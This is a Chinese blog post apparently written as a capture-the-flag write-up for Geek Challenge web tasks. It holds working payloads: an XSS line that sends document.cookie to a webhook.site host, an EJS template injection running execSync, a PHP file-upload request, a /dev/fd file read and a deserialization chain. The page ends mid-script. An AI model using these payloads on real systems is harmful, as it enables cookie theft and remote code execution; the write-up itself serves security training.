<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>第16届极客大挑战 | cheng_xing's blog</title><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Week1Web阿基里斯追乌龟抓包修改一下base64编码后的payload即可 Vibe SEOsitemap.xml泄露aa__^^.php 根据报错信息尝试传入filename参数长度限制是小于11?filename&#x3D;aa__^^.php读源码 12345678&lt;?php$flag &#x3D; fopen(&#x27;&#x2F;my_secret.txt&#x27;, &#x27;r&amp;#x2">
<meta property="og:type" content="article">
<meta property="og:title" content="第16届极客大挑战">
<meta property="og:url" content="https://sakuraraindrop.github.io/2025/10/30/%E7%AC%AC16%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/index.html">
<meta property="og:site_name" content="cheng_xing&#39;s blog">
<meta property="og:description" content="Week1Web阿基里斯追乌龟抓包修改一下base64编码后的payload即可 Vibe SEOsitemap.xml泄露aa__^^.php 根据报错信息尝试传入filename参数长度限制是小于11?filename&#x3D;aa__^^.php读源码 12345678&lt;?php$flag &#x3D; fopen(&#x27;&#x2F;my_secret.txt&#x27;, &#x27;r&amp;#x2">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sakuraraindrop.github.io/img/ltx.jpg">
<meta property="article:published_time" content="2025-10-29T17:07:40.000Z">
<meta property="article:modified_time" content="2025-11-13T08:59:29.908Z">
<meta property="article:author" content="cheng_xing">
<meta property="article:tag" content="php反序列化">
<meta property="article:tag" content="xss">
<meta property="article:tag" content="ret2libc">
<meta property="article:tag" content="ret2csu">
<meta property="article:tag" content="ret2text">
<meta property="article:tag" content="md5">
<meta property="article:tag" content="ejs模板注入">
<meta property="article:tag" content="MCP">
<meta property="article:tag" content="Blockchain">
<meta property="article:tag" content="sage">
<meta property="article:tag" content="env提权">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sakuraraindrop.github.io/img/ltx.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "第16届极客大挑战",
  "url": "https://sakuraraindrop.github.io/2025/10/30/%E7%AC%AC16%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/",
  "image": "https://sakuraraindrop.github.io/img/ltx.jpg",
  "datePublished": "2025-10-29T17:07:40.000Z",
  "dateModified": "2025-11-13T08:59:29.908Z",
  "author": [
    {
      "@type": "Person",
      "name": "cheng_xing",
      "url": "https://sakuraraindrop.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/ltx-icon.jpg"><link rel="canonical" href="https://sakuraraindrop.github.io/2025/10/30/%E7%AC%AC16%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '第16届极客大挑战',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">72</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">163</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx-icon.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">第16届极客大挑战</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">第16届极客大挑战</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-29T17:07:40.000Z" title="发表于 2025-10-30 01:07:40">2025-10-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-13T08:59:29.908Z" title="更新于 2025-11-13 16:59:29">2025-11-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/2025%E7%BA%BF%E4%B8%8A%E8%B5%9B/">2025线上赛</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="阿基里斯追乌龟"><a href="#阿基里斯追乌龟" class="headerlink" title="阿基里斯追乌龟"></a>阿基里斯追乌龟</h3><p>抓包修改一下base64编码后的payload即可</p>
<h3 id="Vibe-SEO"><a href="#Vibe-SEO" class="headerlink" title="Vibe SEO"></a>Vibe SEO</h3><p>sitemap.xml泄露aa__^^.php</p>
<p>根据报错信息尝试传入filename参数<br>长度限制是小于11<br>?filename&#x3D;aa__^^.php读源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;/my_secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) &lt; <span class="number">11</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">readfile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Filename too long&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>尝试了&#x2F;dev&#x2F;3&#x2F;fd或者php:&#x2F;&#x2F;fd&#x2F;3或者var:&#x2F;&#x2F;flag都不行</p>
<p>这个可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filename=/dev/fd/12 //源码</span><br><span class="line">?filename=/dev/fd/13 //flag</span><br></pre></td></tr></table></figure>

<h3 id="Xross-The-Finish-Line"><a href="#Xross-The-Finish-Line" class="headerlink" title="Xross The Finish Line"></a>Xross The Finish Line</h3><p>fuzz出来可用的xss payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=confirm(1)&gt;</span><br></pre></td></tr></table></figure>

<p>然后进一步测试发现过滤了引号</p>
<p>用&#96;代替引号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=fetch(`https://webhook.site/a3e2cdb1-3c78-43d3-9323-24ee284dcf27?c=`+document.cookie)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Expression"><a href="#Expression" class="headerlink" title="Expression"></a>Expression</h3><p>题目描述提到jwt密钥直接照搬的原项目，查看前端源码发现是InfiniteSky，但是查找了一下没有jwt密钥的线索</p>
<p>随便注册个号<a href="mailto:&#49;&#64;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;">1@qq.com</a>，登录后显示欢迎，user_e37babaf316d ！<br>看下cookie里面有个token</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjFAcXEuY29tIiwidXNlcm5hbWUiOiJ1c2VyX2UzN2JhYmFmMzE2ZCIsImlhdCI6MTc2MTgzMzUwNiwiZXhwIjoxNzYyNDM4MzA2fQ.i_tPV5kKmnA8fZDYzFpWf4GoBC2DFKekAnmuZqLDYSs</span><br></pre></td></tr></table></figure>

<p>jwt解一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;email&quot;: &quot;1@qq.com&quot;,</span><br><span class="line">  &quot;username&quot;: &quot;user_e37babaf316d&quot;,</span><br><span class="line">  &quot;iat&quot;: 1761833506,</span><br><span class="line">  &quot;exp&quot;: 1762438306</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以获取到的信息是username被展示在前端页面，这是个nodejs的站，有可能存在ejs模板注入，但是还是要知道jwt的密钥才行</p>
<p>找了个gui工具爆，用自己的字典试了几个发现密钥是secret</p>
<p>那后面直接把username换成<code>&lt;%= global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;env&#39;)%&gt;</code>即可</p>
<h3 id="one-last-image"><a href="#one-last-image" class="headerlink" title="one_last_image"></a>one_last_image</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 019a32d9-6259-7880-b072-e9c9ab7d2254.geek.ctfplus.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://019a32d9-6259-7880-b072-e9c9ab7d2254.geek.ctfplus.cn/</span><br><span class="line">Content-Type: multipart/form-data; boundary=----geckoformboundaryeb486a0d2958e5e142a05c31fa4a6354</span><br><span class="line">Content-Length: 447</span><br><span class="line">Origin: http://019a32d9-6259-7880-b072-e9c9ab7d2254.geek.ctfplus.cn</span><br><span class="line">Connection: close</span><br><span class="line">Priority: u=0</span><br><span class="line"></span><br><span class="line">------geckoformboundaryeb486a0d2958e5e142a05c31fa4a6354</span><br><span class="line">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?=phpinfo();</span><br><span class="line">------geckoformboundaryeb486a0d2958e5e142a05c31fa4a6354</span><br><span class="line">Content-Disposition: form-data; name=&quot;colorsize&quot;</span><br><span class="line"></span><br><span class="line">20</span><br><span class="line">------geckoformboundaryeb486a0d2958e5e142a05c31fa4a6354</span><br><span class="line">Content-Disposition: form-data; name=&quot;mode&quot;</span><br><span class="line"></span><br><span class="line">light</span><br><span class="line">------geckoformboundaryeb486a0d2958e5e142a05c31fa4a6354--</span><br></pre></td></tr></table></figure>

<p>响应包里的报错泄露了路径&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;20fe824b-c6db-47d2-b5e1-be9750f410b6.php<br>访问后找到flag即可</p>
<h3 id="popself"><a href="#popself" class="headerlink" title="popself"></a>popself</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">All_in_one</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KiraKiraAyu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_4ak5ra</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$K4per</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Sams</span>āra;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$komiko</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Fox</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Eureka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QYQS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sleep3r</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ivory</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;他还是没有忘记那个&quot;</span>.<span class="variable">$value</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;收集夏日的碎片吧&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fox</span> = <span class="variable language_">$this</span>-&gt;Fox;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( !(<span class="variable">$fox</span> <span class="keyword">instanceof</span> All_in_one) &amp;&amp; <span class="variable">$fox</span>()===<span class="string">&quot;summer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;QYQS enjoy summer&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;开启循环吧&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$komiko</span> = <span class="variable language_">$this</span>-&gt;komiko;</span><br><span class="line">            <span class="variable">$komiko</span>-&gt;<span class="title function_ invoke__">Eureka</span>(<span class="variable">$this</span>-&gt;L, <span class="variable">$this</span>-&gt;sleep3r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;恭喜成功signin!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome to Geek_Challenge2025!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;Samsāra;</span><br><span class="line">        <span class="variable">$arg</span> = <span class="variable language_">$this</span>-&gt;ivory;</span><br><span class="line">        <span class="variable">$f</span>(<span class="variable">$arg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你能让K4per和KiraKiraAyu组成一队吗&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;K4per)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu))===<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;boys和而不同&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu))==<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;BOY♂ sign GEEK&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;开启循环吧&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;QYQS-&gt;partner = <span class="string">&quot;summer&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;BOY♂ can`t sign GEEK&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu)).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;boys堂堂正正&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;再走一步...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;_4ak5ra;</span><br><span class="line">        <span class="variable">$a</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span>&#123;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$args</span>[<span class="number">0</span>])&lt;<span class="number">4</span> &amp;&amp; (<span class="variable">$args</span>[<span class="number">0</span>]+<span class="number">1</span>)&gt;<span class="number">10000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;再走一步&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$args</span>[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;你要努力进窄门&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">find_myself</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;summer&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;没有大家的压缩包的话，瓦达西！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>链子还是比较明显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct -&gt; __set -&gt; __call -&gt; __tostring -&gt; __invoke</span><br></pre></td></tr></table></figure>

<p>首先在__destruct中要过一个md5的判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(md5($this-&gt;KiraKiraAyu))==md5($this-&gt;K4per)</span><br></pre></td></tr></table></figure>

<p>一开始以为找一个md5后是0e开头的和一个两次md5后是0e开头的就行，结果一直过不了，看了下PHP版本是7.3.4，再问AI得知0e之后必须要全为数字才可以，那就写一个python脚本来爆破寻找两次md5后符合条件的字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 